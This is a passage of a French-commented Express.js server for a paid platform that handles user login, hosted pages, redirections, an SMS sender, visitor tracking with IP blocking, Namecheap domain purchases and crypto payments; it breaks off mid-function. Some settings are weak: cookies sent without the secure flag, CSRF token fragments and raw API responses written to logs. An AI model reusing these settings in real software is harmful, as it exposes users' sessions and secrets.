'use strict';

// Load environment variables - try .env.production first if NODE_ENV not set
if (!process.env.NODE_ENV) {
  require('dotenv').config({ path: '.env.production' });
}
require('dotenv').config();

const express    = require('express');
const session    = require('express-session');
const bcrypt     = require('bcryptjs');
const helmet     = require('helmet');
const rateLimit  = require('express-rate-limit');
const morgan     = require('morgan');
const crypto     = require('crypto');
const fs         = require('fs');
const path       = require('path');
const cookieParser = require('cookie-parser');
const config     = require('./config');
const db         = require('./db');
const smsLib     = require('./lib/sms');
const security   = require('./lib/security');

const app  = express();
const ROOT = __dirname;

/* Trust Railway reverse proxy for secure cookies */
app.set('trust proxy', 1);

const smsRuntime = smsLib.createRuntime(path.resolve(ROOT, config.sms?.storagePath || './data/sms.json'));

/* ── Tracking in-memory store ────────────────────────────────── */
const pageStats    = new Map(); // pageId → { views, visitors: Set<ip>, clicks, blocked, hourly: Map<hourKey,n>, devices: {mobile,desktop} }
const liveVisitors = new Map(); // pageId → Map<ip, timestamp>
const STATS_FILE   = path.resolve(ROOT, 'data', 'stats.json');

function emptyStats() {
  return { views: 0, visitors: new Set(), clicks: 0, blocked: 0, blockedIps: new Set(), hourly: new Map(), devices: { mobile: 0, desktop: 0 } };
}

function isMobileUA(ua = '') {
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
}

function hourKey() {
  return Math.floor(Date.now() / 3_600_000) * 3_600_000;
}

try {
  const saved = JSON.parse(fs.readFileSync(STATS_FILE, 'utf8'));
  for (const [id, s] of Object.entries(saved)) {
    pageStats.set(id, {
      views:      s.views   || 0,
      visitors:   new Set(s.visitors   || []),
      clicks:     s.clicks  || 0,
      blocked:    s.blocked || 0,
      blockedIps: new Set(s.blockedIps || []),
      hourly:     new Map(Array.isArray(s.hourly) ? s.hourly : []),
      devices:    s.devices || { mobile: 0, desktop: 0 },
    });
  }
} catch { /* first run */ }

setInterval(() => {
  const out = {};
  for (const [id, s] of pageStats) {
    out[id] = {
      views: s.views, visitors: [...s.visitors], clicks: s.clicks,
      blocked: s.blocked, blockedIps: [...s.blockedIps],
      hourly: [...s.hourly.entries()], devices: s.devices,
    };
  }
  try { fs.writeFileSync(STATS_FILE, JSON.stringify(out)); } catch {}
}, 30_000);

setInterval(() => {
  // prune live visitors > 2 min
  const cutoff = Date.now() - 2 * 60 * 1000;
  for (const [pid, map] of liveVisitors) {
    for (const [ip, ts] of map) { if (ts < cutoff) map.delete(ip); }
    if (map.size === 0) liveVisitors.delete(pid);
  }
  // prune hourly data > 7 days
  const hourCutoff = Date.now() - 7 * 24 * 3_600_000;
  for (const [, s] of pageStats) {
    for (const [k] of s.hourly) { if (k < hourCutoff) s.hourly.delete(k); }
  }
}, 30_000);

/* Clean URL → HTML file mapping */
const PAGE_MAP = {
  dashboard: 'dashboard.html',
  pages:     'pages.html',
  domaines:      'domaines.html',
  redirections:  'redirections.html',
  compte:    'compte.html',
  plans:     'plans.html',
  sender:    'sender.html',
  shop:      'shop.html',
  admin:     'admin.html',
};

/* ═══════════════════════════════════════════════════════════════
   MIDDLEWARE GLOBAUX
   ═══════════════════════════════════════════════════════════════ */

/* Helmet — sécurité headers stricte */
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'", 'https://unpkg.com'],
      scriptSrcAttr: ["'unsafe-inline'"],
      styleSrc: ["'self'", "'unsafe-inline'", 'https://fonts.googleapis.com'],
      imgSrc: ["'self'", 'data:', 'https:'],
      fontSrc: ["'self'", 'https://fonts.gstatic.com'],
      connectSrc: ["'self'"],
      formAction: ["'self'"],
      frameAncestors: ["'none'"],
      upgradeInsecureRequests: null,
    },
  },
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: { policy: 'same-origin' },
  dnsPrefetchControl: { allow: false },
  frameGuard: { action: 'deny' },
  hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
  noSniff: true,
  referrerPolicy: { policy: 'no-referrer' },
  xssFilter: true,
}));

/* Morgan — HTTP logging */
const logFormat = process.env.NODE_ENV === 'production' ? 'combined' : 'dev';
app.use(morgan(logFormat));

/* Body parsers */
app.use(express.json({ limit: '5mb' }));
app.use(express.urlencoded({ extended: false, limit: '1mb' }));
app.use(cookieParser());

/* Sessions sécurisées */
app.use(session({
  secret:            config.session.secret,
  name:              config.session.name,
  resave:            true,
  saveUninitialized: true,
  rolling:           true,
  cookie: {
    httpOnly:  true,
    secure:    false, // Railway gère le SSL, désactivé pour garantir l'émission du cookie
    sameSite:  'lax',
    maxAge:    config.session.maxAge,
  },
}));


/* Bloquer les fichiers sensibles */
app.use((req, res, next) => {
  const file = req.path.toLowerCase();
  if (
    file === '/server.js'        || file === '/config.js'      ||
    file === '/db.js'            || file === '/package.json'   ||
    file === '/package-lock.json'|| file.startsWith('/data/')  ||
    file.startsWith('/node_modules/')
  ) {
    return res.status(404).end();
  }
  next();
});

/* ── Bloquer TOUT accès direct aux .html ────────────────────────
   Les fichiers .html ne sont jamais servis directement.
   Les URL propres (sans extension) sont utilisées à la place.
   ─────────────────────────────────────────────────────────────── */
app.use((req, res, next) => {
  if (!req.path.toLowerCase().endsWith('.html')) return next();

  const slug = path.basename(req.path, '.html').toLowerCase();

  if (slug === 'login') {
    if (req.session?.userId) return res.redirect('/dashboard');
    return res.sendFile(path.resolve(ROOT, 'login.html'));
  }

  if (PAGE_MAP[slug]) return res.redirect(301, '/' + slug);

  return res.redirect('/login');
});

/* ═══════════════════════════════════════════════════════════════
   RATE LIMITING
   ═══════════════════════════════════════════════════════════════ */
const authLimiter = rateLimit({
  windowMs:               config.security.rateLimitWindow,
  max:                    config.security.rateLimitMax,
  message:                { error: 'Trop de tentatives. Réessayez dans 15 minutes.' },
  standardHeaders:        true,
  legacyHeaders:          false,
  skipSuccessfulRequests: true,
  keyGenerator:           (req) => req.ip,
});

const trackLimiter = rateLimit({
  windowMs: 60 * 1000,      // 1 minute
  max:      60,             // 60 events/min/IP — 1 par seconde, largement suffisant
  standardHeaders: false,
  legacyHeaders:  false,
  keyGenerator:   (req) => req.ip,
  skip: () => false,
});

const adminLimiter = rateLimit({
  windowMs: 60 * 1000,
  max:      30,
  message:  { error: 'Trop de requêtes admin.' },
  standardHeaders: false,
  legacyHeaders:   false,
  keyGenerator:    (req) => req.ip,
});

/* Rate limiters spécialisés par feature */
const smsApiLimiter = rateLimit({
  windowMs: 60 * 1000,
  max:      50,  // 50 requests/min for SMS APIs
  message:  { error: 'SMS API limit exceeded.' },
  standardHeaders: false,
  keyGenerator:    (req) => req.session?.userId || req.ip,
});

const redirectsLimiter = rateLimit({
  windowMs: 60 * 1000,
  max:      40,  // 40 requests/min for redirect operations
  message:  { error: 'Redirects API limit exceeded.' },
  standardHeaders: false,
  keyGenerator:    (req) => req.session?.userId || req.ip,
});

const globalLimiter = rateLimit({
  windowMs: 60 * 1000,
  max:      1000,  // 1000 requests/min global
  standardHeaders: false,
  keyGenerator:    (req) => req.ip,
  skip: (req) => {
    // Skip static assets
    if (req.path.startsWith('/assets/') || req.path.startsWith('/styles/')) return true;
    return false;
  },
});

app.use(globalLimiter);

/* ═══════════════════════════════════════════════════════════════
   CSRF - Double Submit Cookie pattern
   Le token est stocké dans un cookie lisible par JS ET renvoyé dans le body.
   La validation compare le header/body avec le cookie.
   Aucune session requise pour la protection CSRF.
   ═══════════════════════════════════════════════════════════════ */
function generateCsrfToken(req, res) {
  let token = req.cookies?.csrf_token;
  if (!token || token.length < 32) {
    token = crypto.randomBytes(32).toString('hex');
    res.cookie('csrf_token', token, {
      httpOnly: false, // JS doit pouvoir le lire
      secure:   false,
      sameSite: 'lax',
      maxAge:   2 * 60 * 60 * 1000, // 2h
      path:     '/',
    });
  }
  return token;
}

function validateCsrf(req, res, next) {
  const headerToken = req.headers['x-csrf-token'] || req.body?._csrf;
  const cookieToken = req.cookies?.csrf_token;
  // DEBUG: log pour diagnostiquer
  console.log(`[CSRF] header=${headerToken?.slice(0,10)}... cookie=${cookieToken?.slice(0,10)}... match=${headerToken === cookieToken}`);
  if (!headerToken || !cookieToken || headerToken !== cookieToken) {
    console.log(`[CSRF] ✗ BLOCKED - header:${!!headerToken} cookie:${!!cookieToken}`);
    return res.status(403).json({ error: 'Token CSRF invalide ou expiré.' });
  }
  console.log(`[CSRF] ✓ OK`);
  next();
}

/* ═══════════════════════════════════════════════════════════════
   AUTH MIDDLEWARE
   ═══════════════════════════════════════════════════════════════ */
function requireAuth(req, res, next) {
  if (!req.session?.userId) {
    if (req.accepts('html')) return res.redirect('/login');
    return res.status(401).json({ error: 'Non authentifié.' });
  }
  next();
}

/* ═══════════════════════════════════════════════════════════════
   ROUTES HTML (URL propres, sans .html)
   ═══════════════════════════════════════════════════════════════ */

app.get('/', (req, res) => {
  res.redirect(req.session?.userId ? '/dashboard' : '/login');
});

app.get('/login', (req, res) => {
  if (req.session?.userId) return res.redirect('/dashboard');
  res.sendFile(path.resolve(ROOT, 'login.html'));
});

/* ═══════════════════════════════════════════════════════════════
   ROUTES API  (avant /:page pour éviter l'interception)
   ═══════════════════════════════════════════════════════════════ */

app.get('/api/auth/csrf', (req, res) => {
  const token = generateCsrfToken(req, res);
  res.json({ csrfToken: token });
});

app.get('/api/auth/me', requireAuth, async (req, res) => {
  try {
    const user = await db.findUserById(req.session.userId);
    if (!user) {
      req.session.destroy(() => {});
      return res.status(401).json({ error: 'Session invalide.' });
    }
    const { passwordHash, ...safe } = user;
    // Rétrocompatibilité : champs absents sur les anciens comptes
    if (safe.balance       === undefined) safe.balance       = 0;
    if (safe.totalSpent    === undefined) safe.totalSpent    = 0;
    if (safe.plan          === undefined) safe.plan          = null;
    if (safe.planExpiresAt === undefined) safe.planExpiresAt = null;
    if (safe.planStartedAt === undefined) safe.planStartedAt = null;
    if (!Array.isArray(safe.transactions))  safe.transactions  = [];
    res.json(safe);
  } catch {
    res.status(500).json({ error: 'Erreur serveur.' });
  }
});

/* ── INSCRIPTION ─────────────────────────────────────────────── */
app.post('/api/auth/register', authLimiter, security.validators.register, security.handleValidationErrors, async (req, res) => {
  try {
    const { username, password, confirmPassword } = req.body;

    const pwdError = validatePassword(password);
    if (pwdError) return res.status(400).json({ error: pwdError });

    const existing = await db.findUserByUsername(username);
    if (existing) {
      return res.status(409).json({ error: 'Ce nom d\'utilisateur est déjà utilisé.' });
    }

    const passwordHash = await bcrypt.hash(password, config.security.bcryptRounds);
    const count        = await db.countUsers();
    const role         = count === 0 ? 'admin' : 'user';
    const user         = await db.createUser({ username, passwordHash, role });

    req.session.regenerate((err) => {
      if (err) return res.status(500).json({ error: 'Erreur serveur.' });
      req.session.csrfToken = crypto.randomBytes(32).toString('hex');
      req.session.userId    = user.id;
      req.session.username  = user.username;
      res.json({ success: true, redirect: '/dashboard' });
    });

  } catch (err) {
    console.error('[register]', err);
    res.status(500).json({ error: 'Erreur serveur.' });
  }
});

/* ── CONNEXION ───────────────────────────────────────────────── */
app.post('/api/auth/login', authLimiter, async (req, res) => {
  try {
    const { username, password } = req.body;

    if (!username || !password) {
      return res.status(400).json({ error: 'Identifiant et mot de passe requis.' });
    }

    const user = await db.findUserByUsername(username);

    if (user?.lockedUntil && new Date(user.lockedUntil) > new Date()) {
      const remaining = Math.ceil((new Date(user.lockedUntil) - Date.now()) / 60000);
      return res.status(429).json({
        error: `Compte temporairement bloqué. Réessayez dans ${remaining} minute(s).`,
      });
    }

    const DUMMY_HASH = '$2b$12$LJ3m4ys3Lk0TSwHnbfOMeO2M1gqKjM0n5pKmZGq0n5pKmZGq0n5pK';
    const hashToCompare = user?.passwordHash ?? DUMMY_HASH;
    const valid = await bcrypt.compare(password, hashToCompare);

    if (!user || !valid) {
      if (user) {
        const attempts = (user.failedLoginAttempts ?? 0) + 1;
        const updates  = { failedLoginAttempts: attempts };
        if (attempts >= config.security.maxLoginAttempts) {
          updates.lockedUntil         = new Date(Date.now() + config.security.lockoutDuration).toISOString();
          updates.failedLoginAttempts = 0;
        }
        await db.updateUser(user.id, updates);
      }
      return res.status(401).json({ error: 'Identifiant ou mot de passe incorrect.' });
    }

    await db.updateUser(user.id, {
      failedLoginAttempts: 0,
      lockedUntil:         null,
      lastLogin:           new Date().toISOString(),
    });

    req.session.regenerate((err) => {
      if (err) return res.status(500).json({ error: 'Erreur serveur.' });
      req.session.csrfToken = crypto.randomBytes(32).toString('hex');
      req.session.userId    = user.id;
      req.session.username  = user.username;
      res.json({ success: true, redirect: '/dashboard' });
    });

  } catch (err) {
    console.error('[login]', err);
    res.status(500).json({ error: 'Erreur serveur.' });
  }
});

/* ── CHANGEMENT MOT DE PASSE ─────────────────────────────────── */
app.post('/api/auth/password', requireAuth, validateCsrf, async (req, res) => {
  try {
    const { currentPassword, newPassword, confirmPassword } = req.body;
    if (!currentPassword || !newPassword || !confirmPassword)
      return res.status(400).json({ error: 'Tous les champs sont obligatoires.' });

    if (newPassword !== confirmPassword)
      return res.status(400).json({ error: 'Les mots de passe ne correspondent pas.' });

    const pwdError = validatePassword(newPassword);
    if (pwdError) return res.status(400).json({ error: pwdError });

    const user = await db.findUserById(req.session.userId);
    if (!user) return res.status(401).json({ error: 'Session invalide.' });

    const valid = await bcrypt.compare(currentPassword, user.passwordHash);
    if (!valid) return res.status(401).json({ error: 'Mot de passe actuel incorrect.' });

    const passwordHash = await bcrypt.hash(newPassword, config.security.bcryptRounds);
    await db.updateUser(user.id, { passwordHash });

    res.json({ success: true });
  } catch (err) {
    console.error('[password]', err);
    res.status(500).json({ error: 'Erreur serveur.' });
  }
});

/* ── DÉCONNEXION ─────────────────────────────────────────────── */
app.post('/api/auth/logout', (req, res) => {
  req.session.destroy(() => {
    res.clearCookie(config.session.name);
    res.json({ success: true, redirect: '/login' });
  });
});

/* ── PLANS ───────────────────────────────────────────────────── */
app.get('/api/plans', (req, res) => {
  res.json(config.plans);
});

app.post('/api/plans/purchase', requireAuth, validateCsrf, async (req, res) => {
  try {
    const { planId } = req.body;
    const plan = config.plans[planId];
    if (!plan) return res.status(400).json({ error: 'Plan invalide.' });

    let updated;
    try {
      updated = await db.atomicUpdate(req.session.userId, (user) => {
        const balance = user.balance ?? 0;
        if (balance < plan.price) {
          const err = new Error('Solde insuffisant.');
          err.status = 402;
          err.payload = { error: 'Solde insuffisant.', needed: plan.price - balance, balance };
          throw err;
        }
        const now        = new Date();
        const expiresAt  = new Date(now.getTime() + plan.durationDays * 24 * 60 * 60 * 1000);
        const newBalance = parseFloat((balance - plan.price).toFixed(2));
        const totalSpent = parseFloat(((user.totalSpent ?? 0) + plan.price).toFixed(2));
        const tx = makeTx({ type: 'plan_buy', amount: -plan.price, label: `Plan ${plan.name} — 30 jours`, by: 'user' });
        return {
          balance:       newBalance,
          totalSpent,
          plan:          planId,
          planStartedAt: now.toISOString(),
          planExpiresAt: expiresAt.toISOString(),
          transactions:  pushTx(user, tx),
        };
      });
    } catch (e) {
      if (e.status) return res.status(e.status).json(e.payload);
      throw e;
    }

    res.json({ success: true, balance: updated.balance, plan: planId, planExpiresAt: updated.planExpiresAt });
  } catch (err) {
    console.error('[plans/purchase]', err);
    res.status(500).json({ error: 'Erreur serveur.' });
  }
});

/* ── DOMAINES ────────────────────────────────────────────────── */

app.get('/api/domains', requireAuth, async (req, res) => {
  try {
    const user = await db.findUserById(req.session.userId);
    res.json(user?.domains ?? []);
  } catch { res.status(500).json({ error: 'Erreur serveur.' }); }
});

app.delete('/api/domains/:domainId', requireAuth, validateCsrf, async (req, res) => {
  try {
    const user    = await db.findUserById(req.session.userId);
    const domains = (user?.domains ?? []).filter(d => d.id !== req.params.domainId);
    await db.updateUser(user.id, { domains });
    res.json({ success: true });
  } catch { res.status(500).json({ error: 'Erreur serveur.' }); }
});

/* ── Pointer un domaine (sauvegarde DB) ─────────────────────── */
app.post('/api/domains/:domainId/point', requireAuth, validateCsrf, async (req, res) => {
  try {
    const { mode, ip, redirectUrl, redirectType, pageId, pageName } = req.body;
    if (!['none','ip','redirect','page'].includes(mode))
      return res.status(400).json({ error: 'Mode invalide.' });

    const user   = await db.findUserById(req.session.userId);
    const domain = (user?.domains ?? []).find(d => d.id === req.params.domainId);
    if (!domain) return res.status(404).json({ error: 'Domaine introuvable.' });

    /* Mode page → IP serveur */
    const effectiveIp = mode === 'page' ? (config.server.serverIp || null) : (ip || null);

    if (mode === 'page' && !effectiveIp) {
      return res.status(400).json({ error: 'SERVER_IP non configuré dans config.js.' });
    }

    /* Sauvegarder en DB */
    const pointing = {
      mode,
      ip:          effectiveIp,
      redirectUrl:  redirectUrl  || null,
      redirectType: redirectType || '301',
      pageId:       pageId       || null,
      pageName:     pageName     || null,
    };
    const domains = (user.domains ?? []).map(d =>
      d.id === req.params.domainId ? { ...d, pointing } : d
    );
    await db.updateUser(user.id, { domains });

    /* ── Namecheap DNS update si domaine NC et IP connue ── */
    if (domain.source === 'namecheap' && effectiveIp && mode !== 'none') {
      try {
        const parts = domain.name.split('.');
        const tld   = parts.slice(-1)[0];
        const sld   = parts.slice(0, -1).join('.');
        await ncRequest('namecheap.domains.dns.setHosts', {
          SLD:          sld,
          TLD:          tld,
          HostName1:    '@',
          RecordType1:  'A',
          Address1:     effectiveIp,
          TTL1:         '300',
        });
        console.log(`[point] NC DNS A @ → ${effectiveIp} pour ${domain.name}`);
      } catch (dnsErr) {
        console.error(`[point] NC DNS update échoué: ${dnsErr.message}`);
      }
    }

    res.json({ success: true });
  } catch { res.status(500).json({ error: 'Erreur serveur.' }); }
});

/* ══════════════════════════════════════════════════════════════
   NAMECHEAP API
   ══════════════════════════════════════════════════════════════ */

/* ── XML helpers ─────────────────────────────────────────────── */
function _ncAttr(xml, attr) {
  const m = new RegExp(`${attr}="([^"]*)"`, 'i').exec(xml);
  return m ? m[1] : null;
}
function _ncTag(xml, tag) {
  const m = new RegExp(`<${tag}([^>]*)>([\\s\\S]*?)<\\/${tag}>`, 'i').exec(xml);
  return m ? m[0] : null;
}
function _ncAttrs(xml, tag) {
  const re = new RegExp(`<${tag}([^>]*)/?>`, 'gi');
  const results = []; let m;
  while ((m = re.exec(xml))) {
    const attrs = {};
    const attrRe = /([\w]+)="([^"]*)"/g; let a;
    while ((a = attrRe.exec(m[1]))) attrs[a[1]] = a[2];
    results.push(attrs);
  }
  return results;
}

async function ncRequest(command, params = {}) {
  const cfg = config.namecheap;
  if (!cfg.user || !cfg.apiKey) throw new Error('Namecheap non configuré (NC_USER / NC_API_KEY manquants).');
  const base = cfg.testMode
    ? 'https://api.sandbox.namecheap.com/xml.response'
    : 'https://api.namecheap.com/xml.response';
  const qs = new URLSearchParams({
    ApiUser:  cfg.user,
    ApiKey:   cfg.apiKey,
    UserName: cfg.user,
    ClientIp: config.server.serverIp || '127.0.0.1',
    Command:  command,
    ...params,
  });
  const r   = await fetch(`${base}?${qs}`);
  const xml = await r.text();
  console.log(`[nc] ${command} status=${r.status}`, xml.substring(0, 600));
  const status = _ncAttr(xml, 'Status');
  if (status === 'ERROR') {
    const msg = /<Error[^>]*>([^<]+)<\/Error>/i.exec(xml)?.[1] || 'Namecheap API error';
    throw new Error(msg);
  }
  return xml;
}

/* ── Prix de vente TLD (avec marge) ────────────────────────────
   Coût Namecheap → prix client arrondi au .99
   ─────────────────────────────────────────────────────────── */
const TLD_SELL_PRICE = {
  com:  12.99,
  org:   9.99,
  net:  15.99,
  info: 11.99,
  xyz:  11.99,
};
/* TLDs autorisés à la vente — toute autre extension est rejetée côté serveur */
const ALLOWED_TLDS = new Set(Object.keys(TLD_SELL_PRICE));

function applySellPrice(tld, ncPrice) {
  const key = tld.replace(/^\./, '').toLowerCase();
  if (TLD_SELL_PRICE[key] !== undefined) return TLD_SELL_PRICE[key];
  /* Fallback : +18% arrondi au .99 */
  const raw = parseFloat(ncPrice) * 1.18;
  return Math.floor(raw) + 0.99;
}

/* GET /api/domains/nc/status */
app.get('/api/domains/nc/status', requireAuth, (req, res) => {
  const cfg = config.namecheap;
  res.json({ configured: !!(cfg.user && cfg.apiKey) });
});

/* GET /api/domains/nc/tlds — prix TLDs populaires */
app.get('/api/domains/nc/tlds', requireAuth, async (req, res) => {
  try {
    const xml  = await ncRequest('namecheap.users.getPricing', { ProductType: 'DOMAIN', ActionName: 'REGISTER' });
    const items = _ncAttrs(xml, 'Price');
    // Also get product names
    const prodRe = /<Product Name="([^"]+)">([\s\S]*?)<\/Product>/gi;
    const tlds = []; let m;
    while ((m = prodRe.exec(xml))) {
      const name = m[1];
      const priceM = /Price="([^"]+)"/.exec(m[2]);
      if (priceM) tlds.push({ tld: name, price: applySellPrice(name, priceM[1]) });
    }
    res.json({ result: 'OK', data: tlds });
  } catch (err) {
    console.error('[nc/tlds]', err);
    res.status(502).json({ error: err.message });
  }
});

/* POST /api/domains/nc/check — vérifier disponibilité */
app.post('/api/domains/nc/check', requireAuth, async (req, res) => {
  try {
    const { domain } = req.body;
    if (!domain) return res.status(400).json({ error: 'domain requis.' });
    const clean = domain.toLowerCase().replace(/[^a-z0-9.-]/g, '');
    const tldCheck = clean.split('.').slice(1).join('.');
    if (!ALLOWED_TLDS.has(tldCheck))
      return res.status(400).json({ error: `Extension .${tldCheck} non disponible à la vente.` });
    const xml   = await ncRequest('namecheap.domains.check', { DomainList: clean });
    const results = _ncAttrs(xml, 'DomainCheckResult');
    res.json({ result: 'OK', data: results.map(r => ({
      domain:    r.Domain,
      available: r.Available === 'true',
      premium:   r.IsPremiumName === 'true',
      price:     r.Available === 'true'
                   ? applySellPrice(r.Domain.split('.').slice(1).join('.'), r.PremiumRegistrationPrice || 10)
                   : null,
    }))});
  } catch (err) {
    console.error('[nc/check]', err);
    res.status(502).json({ error: err.message });
  }
});

/* POST /api/domains/nc/register — enregistrer un domaine */
app.post('/api/domains/nc/register', requireAuth, validateCsrf, async (req, res) => {
  try {
    const { domain, years = 1, contact } = req.body;
    if (!domain || !contact) return res.status(400).json({ error: 'domain et contact requis.' });

    const user = await db.findUserById(req.session.userId);
    if (!user?.plan || (user.planExpiresAt && new Date(user.planExpiresAt) < new Date()))
      return res.status(402).json({ error: 'Abonnement actif requis.' });
    const plan = config.plans[user.plan];
    if ((user.domains ?? []).length >= (plan?.domainsMax ?? 0))
      return res.status(402).json({ error: `Limite atteinte : ${plan?.domainsMax} domaine(s) max avec le plan ${plan?.name}.` });

    const clean = domain.toLowerCase().replace(/[^a-z0-9.-]/g, '');
    const [name, ...tldParts] = clean.split('.');
    const tld = tldParts.join('.');

    /* ── Whitelist TLD ────────────────────────────────────── */
    if (!ALLOWED_TLDS.has(tld))
      return res.status(400).json({ error: `Extension .${tld} non disponible à la vente.` });

    /* ── Vérifier solde suffisant ─────────────────────────── */
    const sellPrice = applySellPrice(tld, 10) * (years || 1);
    const balance   = user.balance ?? 0;
    if (balance < sellPrice)
      return res.status(402).json({ error: 'Solde insuffisant.', needed: sellPrice - balance, balance });

    const xml = await ncRequest('namecheap.domains.create', {
      DomainName: clean,
      Years:      years,
      AuxBillingFirstName:     contact.firstName,
      AuxBillingLastName:      contact.lastName,
      AuxBillingAddress1:      contact.address,
      AuxBillingCity:          contact.city,
      AuxBillingStateProvince: contact.state || contact.city,
      AuxBillingPostalCode:    contact.zip,
      AuxBillingCountry:       contact.country || 'FR',
      AuxBillingPhone:         contact.phone,
      AuxBillingEmailAddress:  contact.email,
      TechFirstName:           contact.firstName,
      TechLastName:            contact.lastName,
      TechAddress1:            contact.address,
      TechCity:                contact.city,
      TechStateProvince:       contact.state || contact.city,
      TechPostalCode:          contact.zip,
      TechCountry:             contact.country || 'FR',
      TechPhone:               contact.phone,
      TechEmailAddress:        contact.email,
      AdminFirstName:          contact.firstName,
      AdminLastName:           contact.lastName,
      AdminAddress1:           contact.address,
      AdminCity:               contact.city,
      AdminStateProvince:      contact.state || contact.city,
      AdminPostalCode:         contact.zip,
      AdminCountry:            contact.country || 'FR',
      AdminPhone:              contact.phone,
      AdminEmailAddress:       contact.email,
      RegistrantFirstName:     contact.firstName,
      RegistrantLastName:      contact.lastName,
      RegistrantAddress1:      contact.address,
      RegistrantCity:          contact.city,
      RegistrantStateProvince: contact.state || contact.city,
      RegistrantPostalCode:    contact.zip,
      RegistrantCountry:       contact.country || 'FR',
      RegistrantPhone:         contact.phone,
      RegistrantEmailAddress:  contact.email,
      Nameservers:             'dns1.registrar-servers.com,dns2.registrar-servers.com',
      AddFreeWhoisguard:       'yes',
      WGEnabled:               'yes',
    });

    const result = _ncAttrs(xml, 'DomainCreateResult')[0] || {};
    if (result.Registered !== 'true')
      return res.status(400).json({ error: 'Enregistrement échoué.' });

    /* ── Débiter balance ──────────────────────────────────── */
    const newBalance  = parseFloat((balance - sellPrice).toFixed(2));
    const totalSpent  = parseFloat(((user.totalSpent ?? 0) + sellPrice).toFixed(2));
    const tx = makeTx({ type: 'domain_buy', amount: -sellPrice, label: `Domaine ${clean} (${years} an${years > 1 ? 's' : ''})`, by: 'user' });

    const newDomain = {
      id:         crypto.randomUUID(),
      name:       clean,
      source:     'namecheap',
      ncDomainId: result.DomainID || null,
      status:     'active',
      createdAt:  new Date().toISOString(),
      expiresAt:  null,
      pointing:   { mode: 'none', ip: null, redirectUrl: null, redirectType: '301' },
    };

    const freshUser = await db.findUserById(user.id);
    await db.updateUser(user.id, {
      domains:      [...(freshUser.domains ?? []), newDomain],
      balance:      newBalance,
      totalSpent,
      transactions: [...(freshUser.transactions ?? []), tx],
    });

    res.json({ success: true, domain: newDomain, balance: newBalance });
  } catch (err) {
    console.error('[nc/register]', err);
    res.status(502).json({ error: err.message });
  }
});

/* ═══════════════════════════════════════════════════════════════
    NOWPAYMENTS.IO — Paiements Crypto (BTC, ETH, SOL, LTC)
    ═══════════════════════════════════════════════════════════════ */

async function npApi(path, opts = {}) {
  const cfg = config.nowpayments;
  if (!cfg.apiKey) throw new Error('NowPayments non configuré (API key manquante).');
  const requestOpts = {
    ...opts,
    headers: {
      'x-api-key': cfg.apiKey,
      'Content-Type': 'application/json',
      ...(opts.headers || {}),
    },
  };

  const r = await fetch(`${cfg.apiUrl}${path}`, requestOpts);
  const rawText = await r.text();
  let data;
  try {
    data = JSON.parse(rawText);
  } catch (err) {
    data = { message: rawText };
  }
  if (r.ok) return data;

  const msg = data.message || data.error || `HTTP ${r.status}`;
  throw new Error(`NowPayments: ${msg}`);
}

function getNowPaymentsNetwork(currency, networkId) {
  const available = config.nowpayments.currencyNetworks?.[currency] || [];
  if (!networkId || !available.length) return '';
  const normalized = String(networkId || '').trim().toLowerCase();
  const matched = available.find(n => String(n.id || '').toLowerCase() === normalized || String(n.label || '').toLowerCase() === normalized);
  return matched ? String(matched.label).toUpperCase() : '';
}

function getNowPaymentsCurrencyCode(currency, networkId) {
  const normalized = String(currency || '').toLowerCase();
  const network = String(networkId || '').toLowerCase();
  if (normalized === 'usdt') {
    if (network === 'trx' || network === 'trc20') return 'usdttrc20';
    if (network === 'erc20') return 'usdt';
    if (network === 'bep20') return 'usdtbsc';
  }
  if (normalized === 'usdc') {
    if (network === 'erc20') return 'usdc';
    if (network === 'sol') return 'usdcsol';
    if (network === 'bep20') return 'usdcbsc';
  }
  return normalized;
}

/* GET /api/payments/crypto/currencies — liste des devises supportées */
app.get('/api/payments/crypto/currencies', (req, res) => {
  res.json({
    currencies: config.nowpayments.currencies,
    currencyNetworks: config.nowpayments.currencyNetworks || {},
  });
});

/* POST /api/payments/crypto/estimate — estimer le montant crypto */
app.post('/api/payments/crypto/estimate', requireAuth, async (req, res) => {
  try {
    const { amount, currency, network } = req.body;
    if (!amount || !currency) return res.status(400).json({ error: 'amount et currency requis.' });
    const cleanCurrency = currency.toLowerCase().trim();
    let cleanNetwork = typeof network === 'string' ? network.toLowerCase().trim() : '';
    const availableNetworks = config.nowpayments.currencyNetworks?.[cleanCurrency] || [];
    if (availableNetworks.length) {
      if (!cleanNetwork) {
        cleanNetwork = config.nowpayments.defaultNetwork?.[cleanCurrency] || availableNetworks[0].id;
      }
      if (!availableNetworks.some(n => n.id === cleanNetwork || String(n.label || '').toLowerCase() === cleanNetwork)) {
        return res.status(400).json({ error: `Réseau non supporté pour ${cleanCurrency.toUpperCase()}. Choisissez : ${availableNetworks.map(n => n.label).join(', ')}` });
      }
    }
    const currencyCode = getNowPaymentsCurrencyCode(cleanCurrency, cleanNetwork);
    let query = `/estimate?amount=${amount}&currency_from=eur&currency_to=${currencyCode}`;
    const data = await npApi(query);
    res.json({ estimatedAmount: data.estimated_amount, currency: data.currency_to, network: cleanNetwork || null });
  } catch (err) {
    console.error('[np/estimate]', err);
    res.status(502).json({ error: err.message });
  }
});

/* POST /api/payments/crypto/create — créer un paiement */
app.post('/api/payments/crypto/create', requireAuth, validateCsrf, async (req, res) => {
  try {
    const { amount, currency, network } = req.body;
    if (!amount || !currency) return res.status(400).json({ error: 'amount et currency requis.' });
    const cleanCurrency = currency.toLowerCase().trim();
    const cleanNetwork = typeof network === 'string' ? network.toLowerCase().trim() : '';
    const allowedCurrencies = config.nowpayments.currencies;
    if (!allowedCurrencies.includes(cleanCurrency)) {
      return res.status(400).json({ error: `Devise non supportée. Supportées: ${allowedCurrencies.join(', ')}` });
    }
    if (amount < 1) return res.status(400).json({ error: 'Montant minimum : 1€.' });

    const availableNetworks = config.nowpayments.currencyNetworks?.[cleanCurrency] || [];
    let selectedNetwork = cleanNetwork;
    if (availableNetworks.length) {
      if (!selectedNetwork) {
        selectedNetwork = config.nowpayments.defaultNetwork?.[cleanCurrency] || availableNetworks[0].id;
      }
      if (!availableNetworks.some(n => n.id === selectedNetwork || String(n.label || '').toLowerCase() === selectedNetwork)) {
